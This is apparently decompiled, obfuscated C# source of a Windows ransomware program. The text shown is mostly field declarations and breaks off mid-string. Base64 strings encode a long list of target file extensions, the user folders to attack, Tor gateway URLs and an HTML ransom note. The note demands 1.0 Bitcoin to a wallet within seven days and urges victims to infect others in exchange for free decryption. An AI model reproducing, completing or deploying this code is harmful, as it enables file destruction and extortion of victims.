using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace fneicsngjh;

public class uqiyvgotx : Form
{
	private IContainer caiwtr = null;

	private PictureBox oktyw;

	private Label gdarr;

	private Label owfseikso;

	private Timer zsxabttsw;

	private Label cphztnc;

	private Timer fuluqqmvy;

	private Panel nmrnfongih;

	private Label eqbuxanldh;

	private Label xsloixjg;

	private Label xtmkybyej;

	private RichTextBox coxeju;

	private Button xgifxg;

	private Label iuggembcgo;

	private TextBox eplizslo;

	private TextBox pykuvrda;

	private Label jyxeeejr;

	private TextBox lxuybk;

	private Label kjdwytm;

	private Label ehsvktktri;

	private Timer wnhnttlnrn;

	private Label cxifugygdc;

	private Label vyypirhr;

	private BackgroundWorker deyqyrcm;

	private PictureBox pklnsqh;

	private BackgroundWorker pocsbyqznz;

	public static Random gggqstji = new Random();

	public static int iyokq = 0;

	public static int jhqxgirx = 10000000;

	public static int ptxemuvt = 10000;

	public static string[] cjtvt = new string[4]
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Personal),
		Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
		Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
	};

	public static string wbakm = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), klfhxfx("eHh4MzN4eHg="));

	public static string bvyssfbkc = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), klfhxfx("eHh4MzR4eHg="));

	public static string avofijbbk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), klfhxfx("eHh4MzV4eHg="));

	public static string leyeg = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), klfhxfx("eHh4MzZ4eHg="));

	public static string ghfszhoyz = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), klfhxfx("eHh4Mzd4eHg="));

	public static string dasgss = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), klfhxfx("ZG9uZS50bXA="));

	public static string hxlqy = "Microsoft";

	public static string[] bcyfadlv = klfhxfx("LjFjZHwuM2RtfC4zZHN8LjNmcnwuM2cyfC4zZ3B8LjNwcnwuN3p8Ljd6aXB8LmFhY3wuYWFmfC5hYjR8LmFjY2RifC5hY2NkZXwuYWNjZHJ8LmFjY2R0fC5hY2h8LmFjcnwuYWN0fC5hZGJ8LmFkcHwuYWRzfC5hZXB8LmFlcHh8LmFlc3wuYWV0fC5hZ2RsfC5haXwuYWlmfC5haWZmfC5haXR8LmFsfC5hbXJ8LmFvaXwuYXBqfC5hcGt8LmFyY2gwMHwuYXJ3fC5hc3wuYXMzfC5hc2Z8LmFzbXwuYXNwfC5hc3B4fC5hc3NldHwuYXN4fC5hdHJ8LmF2aXwuYXdnfC5iYWNrfC5iYWNrdXB8LmJhY2t1cGRifC5iYWt8LmJhcnwuYmF5fC5iYzZ8LmJjN3wuYmRifC5iZ3R8LmJpZ3wuYmlrfC5iaW58LmJrZnwuYmtwfC5ibGVuZHwuYmxvYnwuYm1kfC5ibXB8LmJwd3wuYnNhfC5jfC5jYXN8LmNkY3wuY2RmfC5jZHJ8LmNkcjN8LmNkcjR8LmNkcjV8LmNkcjZ8LmNkcnd8LmNkeHwuY2UxfC5jZTJ8LmNlcnwuY2ZnfC5jZnJ8LmNnbXwuY2lifC5jbGFzc3wuY2xzfC5jbXR8LmNvbmZpZ3wuY29udGFjdHwuY3BpfC5jcHB8LmNyMnwuY3Jhd3wuY3J0fC5jcnd8LmNzfC5jc2h8LmNzbHwuY3NzfC5jc3Z8LmQzZGJzcHwuZGFjfC5kYXJ8LmRhc3wuZGF0fC5kYXppcHwuZGJ8LmRiMHwuZGIzfC5kYmF8LmRiZnwuZGJ4fC5kYl9qb3VybmFsfC5kYzJ8LmRjcnwuZGNzfC5kZGR8LmRkb2N8LmRkcnd8LmRkc3wuZGVyfC5kZXN8LmRlc2N8LmRlc2lnbnwuZGdjfC5kaXJ8LmRpdHwuZGp2dXwuZG1wfC5kbmd8LmRvY3wuZG9jYnwuZG9jbXwuZG9jeHwuZG90fC5kb3RtfC5kb3R4fC5kcmZ8LmRyd3wuZHRkfC5kd2d8LmR4YnwuZHhmfC5keGd8LmVhc218LmVkYnwuZWZ4fC5lbWx8LmVwa3wuZXBzfC5lcmJzcWx8LmVyZnwuZXNtfC5leGZ8LmZkYnwuZmZ8LmZmZHwuZmZmfC5maHwuZmhkfC5mbGF8LmZsYWN8LmZsZnwuZmx2fC5mbHZ2fC5mb3JnZXwuZm9zfC5mcGt8LmZweHwuZnNofC5meGd8LmdkYnwuZ2RvY3wuZ2hvfC5naWZ8LmdtYXB8LmdyYXl8LmdyZXl8Lmdyb3Vwc3wuZ3J5fC5nc2hlZXR8Lmh8Lmhia3wuaGRkfC5oa2RifC5oa3h8LmhwbGd8LmhwcHwuaHRtfC5odG1sfC5odnBsfC5pYmFua3wuaWJkfC5pYnp8LmljeHN8LmlkbWx8LmlkeHwuaWZmfC5paWZ8LmlpcXwuaW5jcGFzfC5pbmRifC5pbmRkfC5pbmRsfC5pbmR0fC5pbnh8Lml0ZGJ8Lml0bHwuaXRtfC5pd2R8Lml3aXwuamFyfC5qYXZhfC5qbnR8LmpwZXwuanBlZ3wuanBnfC5qc3wua2MyfC5rZGJ8LmtkYnh8LmtkY3wua2V5fC5rZnwua3BkeHwua3dtfC5sYWNjZGJ8LmxheW91dHwubGJmfC5sY2t8LmxkZnwubGl0fC5saXRlbW9kfC5sb2d8LmxyZnwubHR4fC5sdWF8Lmx2bHwubXwubTJ8Lm0ydHN8Lm0zdXwubTN1OHwubTRhfC5tNHB8Lm00dXwubTR2fC5tYXB8Lm1heHwubWJ4fC5tY21ldGF8Lm1kfC5tZGJ8Lm1kYmFja3VwfC5tZGN8Lm1kZGF0YXwubWRmfC5tZGl8Lm1lZnwubWVudXwubWZ3fC5taWR8Lm1rdnwubWxifC5tbHh8Lm1td3wubW55fC5tb3N8Lm1vdnwubXAzfC5tcDR8Lm1wYXwubXBlZ3wubXBnfC5tcHB8Lm1wcWdlfC5tcnd8Lm1yd3JlZnwubXNnfC5teWR8Lm5jfC5uY2Z8Lm5kfC5uZGR8Lm5kZnwubmVmfC5uazJ8Lm5vcHwubnJ3fC5uczJ8Lm5zM3wubnM0fC5uc2R8Lm5zZnwubnNnfC5uc2h8Lm50bHwubnZyYW18Lm53YnwubngyfC5ueGx8Lm55Znwub2FifC5vYmp8Lm9kYnwub2RjfC5vZGZ8Lm9kZ3wub2RtfC5vZHB8Lm9kc3wub2R0fC5vZ2d8Lm9pbHwub3JmfC5vc3R8Lm90Z3wub3RofC5vdHB8Lm90c3wub3R0fC5wMTJ8LnA3YnwucDdjfC5wYWJ8LnBhZ2VzfC5wYWt8LnBhc3wucGF0fC5wY2R8LnBjdHwucGRifC5wZGR8LnBkZnwucGVmfC5wZW18LnBmeHwucGhwfC5waWZ8LnBrcGFzc3wucGx8LnBsYnwucGxjfC5wbHR8LnBsdXNfbXVoZHwucG1kfC5wbmd8LnBvfC5wb3R8LnBvdG18LnBvdHh8LnBwYW18LnBwanwucHBrfC5wcHN8LnBwc218LnBwc3h8LnBwdHwucHB0bXwucHB0eHwucHJlbHwucHJmfC5wcnByb2p8LnBzfC5wc2FmZTN8LnBzZHwucHNrfC5wc3R8LnB0eHwucHdtfC5weXwucWJhfC5xYmJ8LnFibXwucWJyfC5xYnd8LnFieHwucWJ5fC5xY293fC5xY293MnwucWRmfC5xZWR8LnFpY3wucjNkfC5yYXwucmFmfC5yYXJ8LnJhdHwucmF3fC5yYnwucmRifC5yZTR8LnJnc3MzYXwucmltfC5ybXwucm9mbHwucnRmfC5ydnR8LnJ3MnwucndsfC5yd3p8LnMzZGJ8LnNhZmV8LnNhczdiZGF0fC5zYXZ8LnNhdmV8LnNheXwuc2J8LnNkMHwuc2RhfC5zZGZ8LnNlc3wuc2h4fC5zaWR8LnNpZGR8LnNpZG58LnNpZXwuc2lzfC5zbGRhc218LnNsZGJsa3wuc2xkbXwuc2xkcHJ0fC5zbGR4fC5zbG18LnNueHwuc3FsfC5zcWxpdGV8LnNxbGl0ZTN8LnNxbGl0ZWRifC5zcjJ8LnNyZnwuc3J0fC5zcnd8LnN0NHwuc3Q1fC5zdDZ8LnN0N3wuc3Q4fC5zdGN8LnN0ZHwuc3RpfC5zdGx8LnN0bXwuc3R3fC5zdHh8LnN1bXwuc3ZnfC5zd2Z8LnN4Y3wuc3hkfC5zeGd8LnN4aXwuc3htfC5zeHd8LnN5bmNkYnwudDEyfC50MTN8LnRhcHwudGF4fC50ZXh8LnRnYXwudGhtfC50aWZ8LnRsZ3wudG9yfC50eHR8LnVwa3wudjNkfC52Ym94fC52Y2Z8LnZkZnwudmRpfC52ZnMwfC52aGR8LnZoZHh8LnZtZGt8LnZtc2R8LnZteHwudm14Znwudm9ifC52cGt8LnZwcF9wY3wudnRmfC53M3h8LndhYnwud2FkfC53YWxsZXR8Lndhdnwud2IyfC53bWF8Lndtb3wud212fC53b3RyZXBsYXl8LndwZHwud3BzfC54MTF8LngzZnwueGZ8Lnhpc3wueGxhfC54bGFtfC54bGt8LnhsbHwueGxtfC54bHJ8Lnhsc3wueGxzYnwueGxzYjNkbXwueGxzbXwueGxzeHwueGx0fC54bHRtfC54bHR4fC54bHd8LnhtbHwueHF4fC54eHh8LnljYmNyYXwueXV2fC56aXB8Lnp0bXA=").Split(new char[1] { '|' });

	public static string[] tacshrq = klfhxfx("aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24udG8vaW1hZ2VzL3xodHRwczovLzNobnVoeWR1NHBkMjQ3cWIub25pb24udG8vaW1hZ2VzL3xodHRwOi8vM2hudWh5ZHU0cGQyNDdxYi5vbmlvbi5jYWIvaW1hZ2VzL3xodHRwczovLzNobnVoeWR1NHBkMjQ3cWIub25pb24uY2FiL2ltYWdlcy98aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIudG9yc3Rvcm0ub3JnL2ltYWdlcy98aHR0cHM6Ly8zaG51aHlkdTRwZDI0N3FiLnRvcnN0b3JtLm9yZy9pbWFnZXMvfGh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLm9uaW9uLm51L2ltYWdlcy98aHR0cHM6Ly8zaG51aHlkdTRwZDI0N3FiLm9uaW9uLm51L2ltYWdlcy98aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIudG9yMndlYi5vcmcvaW1hZ2VzL3xodHRwczovLzNobnVoeWR1NHBkMjQ3cWIudG9yMndlYi5vcmcvaW1hZ2VzLw==").Split(new char[1] { '|' });

	public int yuhqaa = tacshrq.Length - 1;

	public static string dhhoygb = klfhxfx("LmZpbG9jaw==");

	public static string iafidrenke = klfhxfx("PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPiA8aGVhZD4gPHRpdGxlPldhcm5pbmcgTWVzc2FnZTwvdGl0bGU+IDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4gPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4gPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjMuNy9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPiA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMy4xLjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+IDxzY3JpcHQgc3JjPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjMuNy9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmlwdD4gPHNjcmlwdCBzcmM9Imh0dHBzOi8vcmVuZHJvLmdpdGh1Yi5pby9jb3VudGRvd24vamF2YXNjcmlwdHMvanF1ZXJ5LmNvdW50ZG93bi5qcyI+PC9zY3JpcHQ+IDxzdHlsZT5we3BhZGRpbmc6IDVweCAwcHg7fTwvc3R5bGU+IDwvaGVhZD4gPGJvZHk+IDxkaXYgaWQ9InBhaWQiIGNsYXNzPSJjb250YWluZXIgaGlkZSI+IDxkaXYgY2xhc3M9InJvdyI+IDxkaXYgY2xhc3M9ImNvbC1zbS0xMiI+IDxoMT5UaGFuayB5b3UgZm9yIHlvdXIgcGF5bWVudDwvaDE+IDxicj48aDQ+V2Uga25vdyB0aGF0IHdlIGZvcmNlZCB5b3UgdG8gcGF5LCBidXQgYmUgc3VyZSB0aGF0IHRoZSBwYXltZW50IHdhcyBmb3IgYSBnb29kIGNhdXNlLCBUaGUgbW9uZXkgeW91IGdhdmUgd2lsbCBiZSB1c2VkIGZvciBmb29kLCBtZWRpY2luZSBhbmQgc2hlbHRlciB0byB0aG9zZSBpbiBuZWVkLjwvaDQ+IDxicj48ZGl2PiBUbyBnZXQgeW91ciBkZWNyeXB0aW9uIGNvZGUsIHBsZWFzZSB2aXNpdCBvbmUgb2YgdGhlIGxpbmtzIGJlbG93OiA8YnI+PGJyPjx1bD48bGk+PGEgaHJlZj1odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi5vbmlvbi50by9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlIHRhcmdldD1fYmxhbms+aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24udG8vZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZTwvYT48L2xpPjxsaT48YSBocmVmPWh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLm9uaW9uLmNhYi9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlIHRhcmdldD1fYmxhbms+aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24uY2FiL2dldGNvZGUvMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGU8L2E+PC9saT48bGk+PGEgaHJlZj1odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi50b3JzdG9ybS5vcmcvZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZSB0YXJnZXQ9X2JsYW5rPmh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLnRvcnN0b3JtLm9yZy9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlPC9hPjwvbGk+PGxpPjxhIGhyZWY9aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24ubnUvZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZSB0YXJnZXQ9X2JsYW5rPmh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLm9uaW9uLm51L2dldGNvZGUvMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGU8L2E+PC9saT48bGk+PGEgaHJlZj1odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi50b3Iyd2ViLm9yZy9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlIHRhcmdldD1fYmxhbms+aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIudG9yMndlYi5vcmcvZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZTwvYT48L2xpPjwvdWw+IDwvZGl2PjxkaXY+IElmIG5vbmUgb2YgdGhlIGxpbmtzIHdvcmssIHBsZWFzZSBkb3dubG9hZCBhbmQgaW5zdGFsbCBUT1IgYnJvd3NlciBmcm9tIHRoaXMgbGluayAoPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9ycHJvamVjdC5vcmcvZG93bmxvYWQvZG93bmxvYWQtZWFzeS5odG1sLmVuIiB0YXJnZXQ9Il9ibGFuayI+RG93bmxvYWQgVG9yIEJyb3dzZXI8L2E+KSBhbmQgYWZ0ZXIgb3BlbmluZyBUb3IgYnJvd3NlciB2aXNpdCBvbmUgb2YgdGhpcyBsaW5rczogPGJyPjxicj48dWw+PGxpPjxhIGhyZWY9aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24vZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZSB0YXJnZXQ9X2JsYW5rPmh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLm9uaW9uL2dldGNvZGUvMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGU8L2E+PC9saT48L3VsPiA8L2Rpdj48cD4gV2hlbiB5b3UgdmlzaXQgeW91ciBsaW5rIHlvdSB3aWxsIGdldCB5b3VyIHBlcnNvbmFsIHVuaXF1ZSBkZWNyeXB0aW9uIGNvZGUsIGNvcHkgJiBwYXN0ZSBpdCB0byB0aGUgd2luZG93IGFuZCBhbGwgb2YgeW91ciBmaWxlcyB3aWxsIGJlIGRlY3J5cHRlZCBpbW1lZGlhdGVseS4gPC9wPjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgaWQ9Im5vdHBhaWQiIGNsYXNzPSJqdW1ib3Ryb24gdGV4dC1jZW50ZXIiPiA8aDEgc3R5bGU9ImNvbG9yOiByZWQ7IG1hcmdpbjogMHB4OyI+V2FybmluZyBNZXNzYWdlISE8L2gxPiA8cD5XZSBhcmUgc29ycnkgdG8gc2F5IHRoYXQgeW91ciBjb21wdXRlciBhbmQgPHN0cm9uZyBzdHlsZT0iY29sb3I6IHJlZDsiPnlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZDwvc3Ryb25nPiwgPEJSPiBidXQgd2FpdCwgZG9uJ3Qgd29ycnkuIFRoZXJlIGlzIGEgd2F5IHRoYXQgeW91IGNhbiByZXN0b3JlIHlvdXIgY29tcHV0ZXIgYW5kIGFsbCBvZiB5b3VyIGZpbGVzPC9wPjxkaXYgY2xhc3M9ImNvdW50ZG93biI+IDxoMyBpZD0iY2xvY2siIHN0eWxlPSJjb2xvcjogZ3JlZW47Ij48L2gzPiBUaW1lIHJlbWFpbiB3aGVuIHlvdXIgZmlsZXMgd2lsbCBsb3N0IGZvcmV2ZXIhIDwvZGl2PjwvZGl2PjxkaXYgaWQ9Im5vdHBhaWQxIiBjbGFzcz0iY29udGFpbmVyIG5vdHBhaWQiPiA8ZGl2IGNsYXNzPSJyb3ciPiA8ZGl2IGNsYXNzPSJjb2wtc20tMTIgYWxlcnQtaW5mbyB0ZXh0LWNlbnRlciI+IDxoMz5Zb3VyIHBlcnNvbmFsIHVuaXF1ZSBJRDogPHN0cm9uZyBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IGNvbG9yOiByZWQ7Ij4zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZTwvc3Ryb25nPjwvaDM+IDxoMz5QbGVhc2Ugc2VuZCBhdCBsZWFzdCA8c3Ryb25nIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsgY29sb3I6IHJlZDsiPjEuMCBCaXRjb2luPC9zdHJvbmc+IHRvIGFkZHJlc3MgPHN0cm9uZyBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IGNvbG9yOiByZWQ7Ij4xRzIxa0ttVUpiTWpMMVl1ZUhONmFFMjhaTHBZNHQyUG4zPC9zdHJvbmc+PC9oMz4gPGJyPjxoND48YnV0dG9uIGlkPSJjaGtiYWxhbmNlIj5DbGljayB0byBjaGVjayB5b3VyIEJhbGFuY2U8L2J1dHRvbj48YnI+PHNtYWxsPjxzdHJvbmcgaWQ9ImJhbGFuY2UiPjwvc3Ryb25nPjwvc21hbGw+PC9oND4gPC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0icm93Ij4gPGRpdiBjbGFzcz0iY29sLXNtLTYiPiA8aDM+UmVzdG9yaW5nIHlvdXIgZmlsZXMgLSBUaGUgZmFzdCBhbmQgZWFzeSB3YXk8L2gzPiA8cD5UbyBnZXQgeW91ciBmaWxlcyBmYXN0LCBwbGVhc2UgdHJhbnNmZXIgPHN0cm9uZyBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IGNvbG9yOiByZWQ7Ij4xLjAgQml0Y29pbjwvc3Ryb25nPiB0byBvdXIgd2FsbGV0IGFkZHJlc3MgPHN0cm9uZyBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IGNvbG9yOiByZWQ7Ij4xRzIxa0ttVUpiTWpMMVl1ZUhONmFFMjhaTHBZNHQyUG4zPC9zdHJvbmc+LiBXaGVuIHdlIHdpbGwgZ2V0IHRoZSBtb25leSwgd2Ugd2lsbCBpbW1lZGlhdGVseSBnaXZlIHlvdSB5b3VyIHByaXZhdGUgZGVjcnlwdGlvbiBrZXkuIFBheW1lbnQgc2hvdWxkIGJlIGNvbmZpcm1lZCBpbiBhYm91dCAyIGhvdXJzIGFmdGVyIHBheW1lbnQgbWFkZS48L3A+PC9kaXY+PGRpdiBjbGFzcz0iY29sLXNtLTYiPiA8aDM+UmVzdG9yaW5nIHlvdXIgZmlsZXMgLSBUaGUgbmFzdHkgd2F5PC9oMz4gPHA+U2VuZCB0aGUgbGluayBiZWxvdyB0byBvdGhlciBwZW9wbGUsIGlmIHR3byBvciBtb3JlIHBlb3BsZSB3aWxsIGluc3RhbGwgdGhpcyBmaWxlIGFuZCBwYXksIHdlIHdpbGwgZGVjcnlwdCB5b3VyIGZpbGVzIGZvciBmcmVlLjwvcD48aW5wdXQgdHlwZT0idGV4dCIgdmFsdWU9Imh0dHBzOi8vM2hudWh5ZHU0cGQyNDdxYi5vbmlvbi50by9yLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlIiBzaXplPSI4MCUiIHN0eWxlPSJjb2xvcjogYmx1ZTsiLz4gPC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0icm93Ij4gPGRpdiBjbGFzcz0iY29sLXNtLTEyIj4gPGgzPkdldCBjb2RlIHRvIHJlc3RvcmUgeW91ciBmaWxlczwvaDM+IDxkaXY+IFRvIGdldCB5b3VyIGRlY3J5cHRpb24gY29kZSwgcGxlYXNlIHZpc2l0IG9uZSBvZiB0aGUgbGlua3MgYmVsb3c6IDxicj48YnI+PHVsPjxsaT48YSBocmVmPWh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLm9uaW9uLnRvL2dldGNvZGUvMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGUgdGFyZ2V0PV9ibGFuaz5odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi5vbmlvbi50by9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlPC9hPjwvbGk+PGxpPjxhIGhyZWY9aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24uY2FiL2dldGNvZGUvMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGUgdGFyZ2V0PV9ibGFuaz5odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi5vbmlvbi5jYWIvZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZTwvYT48L2xpPjxsaT48YSBocmVmPWh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLnRvcnN0b3JtLm9yZy9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlIHRhcmdldD1fYmxhbms+aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIudG9yc3Rvcm0ub3JnL2dldGNvZGUvMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGU8L2E+PC9saT48bGk+PGEgaHJlZj1odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi5vbmlvbi5udS9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlIHRhcmdldD1fYmxhbms+aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24ubnUvZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZTwvYT48L2xpPjxsaT48YSBocmVmPWh0dHA6Ly8zaG51aHlkdTRwZDI0N3FiLnRvcjJ3ZWIub3JnL2dldGNvZGUvMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGUgdGFyZ2V0PV9ibGFuaz5odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi50b3Iyd2ViLm9yZy9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlPC9hPjwvbGk+PC91bD4gPC9kaXY+PGRpdj4gSWYgbm9uZSBvZiB0aGUgbGlua3Mgd29yaywgcGxlYXNlIGRvd25sb2FkIGFuZCBpbnN0YWxsIFRPUiBicm93c2VyIGZyb20gdGhpcyBsaW5rICg8YSBocmVmPSJodHRwczovL3d3dy50b3Jwcm9qZWN0Lm9yZy9kb3dubG9hZC9kb3dubG9hZC1lYXN5Lmh0bWwuZW4iIHRhcmdldD0iX2JsYW5rIj5Eb3dubG9hZCBUb3IgQnJvd3NlcjwvYT4pIGFuZCBhZnRlciBvcGVuaW5nIFRvciBicm93c2VyIHZpc2l0IG9uZSBvZiB0aGlzIGxpbmtzOiA8YnI+PGJyPjx1bD48bGk+PGEgaHJlZj1odHRwOi8vM2hudWh5ZHU0cGQyNDdxYi5vbmlvbi9nZXRjb2RlLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlIHRhcmdldD1fYmxhbms+aHR0cDovLzNobnVoeWR1NHBkMjQ3cWIub25pb24vZ2V0Y29kZS8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZTwvYT48L2xpPjwvdWw+IDwvZGl2PjxwPiBXaGVuIHlvdSB2aXNpdCB5b3VyIGxpbmsgeW91IHdpbGwgZ2V0IHlvdXIgcGVyc29uYWwgdW5pcXVlIGRlY3J5cHRpb24gY29kZSwgY29weSAmIHBhc3RlIGl0IHRvIHRoZSB3aW5kb3cgYW5kIGFsbCBvZiB5b3VyIGZpbGVzIHdpbGwgYmUgZGVjcnlwdGVkIGltbWVkaWF0ZWx5LiA8L3A+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0icm93Ij4gPGRpdiBjbGFzcz0iY29sLXNtLTQiPiA8aDM+V2hhdCB3ZSBkaWQ/PC9oMz4gPHA+IFdlIGhhZCBlbmNyeXB0ZWQgYWxsIG9mIHlvdXIgaW1wb3J0YW50IGltYWdlcywgZG9jdW1lbnRzLCB2aWRlb3MgYW5kIGFsbCBvdGhlciBmaWxlcyBvbiB5b3VyIGNvbXB1dGVyLiBXZSB1c2VkIGEgdmVyeSBzdHJvbmcgZW5jcnlwdGlvbiBhbGdvcml0aG0gdGhhdCB1c2VkIGJ5IGFsbCBnb3Zlcm5tZW50cyBhbGwgb3ZlciB0aGUgd29ybGQgPGEgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQWR2YW5jZWRfRW5jcnlwdGlvbl9TdGFuZGFyZCIgdGFyZ2V0PSJfYmxhbmsiPihFbmNyeXB0aW9uIC1XaWtpcGVkaWEpPC9hPi4gV2Ugc3RvcmUgeW91ciBwZXJzb25hbCBkZWNyeXB0aW9uIGNvZGUgdG8geW91ciBmaWxlcyBvbiBvdXIgc2VydmVycyBhbmQgd2UgYXJlIHRoZSBvbmx5IG9uZXMgdGhhdCBjYW4gZGVjcnlwdCB5b3VyIGZpbGVzLiBQbGVhc2UgZG9uJ3QgdHJ5IHRvIGJlIHNtYXJ0LCBhbnl0aGluZyBvdGhlciB0aGFuIHBheW1lbnQgd2lsbCBjYXVzZSBkYW1hZ2UgdG8geW91ciBmaWxlcyBhbmQgdGhlIGZpbGVzIHdpbGwgYmUgbG9zdCBmb3JldmVyISEhIDwvcD48cCBjbGFzcz0iYWxlcnQtZGFuZ2VyIHRleHQtY2VudGVyIiBzdHlsZT0icGFkZGluZzogNXB4IDEwcHgiPiBJZiB5b3Ugd2lsbCBub3QgcGF5IGZvciB0aGUgbmV4dCA3IGRheXMsIHRoZSBkZWNyeXB0aW9uIGtleSB3aWxsIGJlIGRlbGV0ZWQgYW5kIHlvdXIgZmlsZXMgd2lsbCBiZSBsb3N0IGZvcmV2ZXIuIDwvcD48L2Rpdj48ZGl2IGNsYXNzPSJjb2wtc20tNyI+IDxoMz5XaHkgd2UgZG8gdGhhdD88L2gzPiA8cD4gV2UgYXJlIGEgZ3JvdXAgb2YgY29tcHV0ZXIgc2NpZW5jZSBzdHVkZW50cyBmcm9tIFN5cmlhLCBhcyB5b3UgcHJvYmFibHkga25vdyBTeXJpYSBpcyBoYXZpbmcgYmFkIHRpbWUgZm9yIHRoZSBsYXN0IDUgeWVhcnMuIFNpbmNlIDIwMTEgd2UgaGF2ZSBtb3JlIHRoZSBoYWxmIG1pbGxpb24gcGVvcGxlIGRpZWQgYW5kIG92ZXIgNSBtaWxsaW9uIHJlZnVnZWVzLiBFYWNo